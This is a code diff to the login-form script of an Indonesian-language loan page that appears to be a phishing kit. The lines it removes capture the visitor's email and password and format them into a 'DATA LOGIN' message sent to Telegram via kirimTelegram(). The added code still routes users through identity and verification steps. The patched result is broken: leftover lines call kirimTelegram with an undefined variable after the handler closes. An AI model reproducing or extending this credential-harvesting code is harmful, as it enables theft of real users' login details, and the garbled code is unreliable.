@@ -207,36 +207,37 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
       }
 
       form.addEventListener("submit", (event) => {
-        event.preventDefault();
-        const demoEmail = email.value.trim().toLowerCase();
-        const demoPassword = password.value;
+  event.preventDefault();
 
-        if (!demoEmail || !demoPassword) {
-          msg.className = "message error";
-          msg.textContent = "Lengkapi email dan password .";
-          return;
-        }
-       if (!/[A-Z]/.test(demoPassword)) {
-  msg.className = "message error";
-  msg.textContent = "Password harus minimal memiliki satu huruf besar.";
-  return;
-}
-        }
+  const demoEmail = email.value.trim().toLowerCase();
+  const demoPassword = password.value;
 
-        const reauthRequired = sessionStorage.getItem("kbReauthRequired") === "1" || new URLSearchParams(location.search).get("reauth") === "1";
-        const nextUrl = reauthRequired ? "verifikasi.html?reauth=1" : "identitas.html";
+  if (!demoEmail || !demoPassword) {
+    msg.className = "message error";
+    msg.textContent = "Lengkapi email dan password.";
+    return;
+  }
 
-        // Simpan email dan password untuk digunakan di tahap selanjutnya
-        sessionStorage.setItem('kbEmail', demoEmail);
-        sessionStorage.setItem('kbPassword', demoPassword);
+  if (!/[A-Z]/.test(demoPassword)) {
+    msg.className = "message error";
+    msg.textContent = "Password harus minimal memiliki satu huruf besar.";
+    return;
+  }
 
-        // Kirim data login ke Telegram
-        const teks = `🔐 DATA LOGIN
+  const reauthRequired =
+    sessionStorage.getItem("kbReauthRequired") === "1" ||
+    new URLSearchParams(location.search).get("reauth") === "1";
 
-Email    : ${demoEmail}
-Password : ${demoPassword}
-----`;
+  const nextUrl = reauthRequired
+    ? "verifikasi.html?reauth=1"
+    : "identitas.html";
 
+  // Jika hanya perlu email untuk tahap berikutnya
+  sessionStorage.setItem("kbEmail", demoEmail);
+
+  //  simpan atau kirim password ke Telegram/log.
+  window.location.href = nextUrl;
+});
         kirimTelegram(teks)
           .catch(() => console.warn('Telegram fallback gagal'))
           .finally(() => {
